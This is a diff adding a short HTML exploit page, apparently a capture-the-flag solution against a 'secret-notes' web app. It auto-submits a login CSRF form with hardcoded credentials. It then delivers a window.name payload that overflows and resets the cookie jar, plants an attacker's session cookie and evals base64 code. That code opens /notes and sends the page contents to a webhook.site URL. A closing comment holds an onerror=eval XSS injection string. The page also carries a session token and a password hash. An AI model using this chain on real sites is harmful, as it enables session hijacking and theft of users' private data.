@@ -1,0 +1,20 @@
+<html>
+
+<body>
+  <form action="https://secret-notes.1nf1n1ty.team/login" method="POST">
+    <input type="hidden" name="username" value="abdulhaq" />
+    <input type="hidden" name="password" value="7e7fb51930c9fb131bc343c89066030bc731c5c7" />
+    <input type="submit" value="Submit request" />
+  </form>
+  <script>
+    let url = "https://webhook.site/f4f18541-db6a-4e5f-bdb4-7a0f11216ad6"
+    let cookie = "eyJ1c2VybmFtZSI6ImFiZHVsaGFxMiJ9.ZwFQLg.3N97U_Dkf1OcdxN-Qaj7BZ11kRE"
+    let part2 = 'let data = window.open("/notes");setInterval( function (){ data? window.location = `' + url + '?flag=${btoa(data.document.body.innerHTML)}`:console.log(data)}, 100)'
+    window.name = "for (let i = 0; i < 700; i++) {document.cookie = `cookie${i}=${i}; Secure`;} for (let i = 0; i < 700; i++) {document.cookie = `cookie${i}=${i};expires=Thu, 01 Jan 1970 00:00:01 GMT`;};document.cookie=`session="+cookie+"; path=/profile`;window.name='eval(atob(`" + btoa(part2) + "`))'"
+    history.pushState('', '', '/');
+    document.forms[0].submit();
+  </script>
+</body>
+</html>
+
+<!-- \ src/onerror=eval(window.name) -->
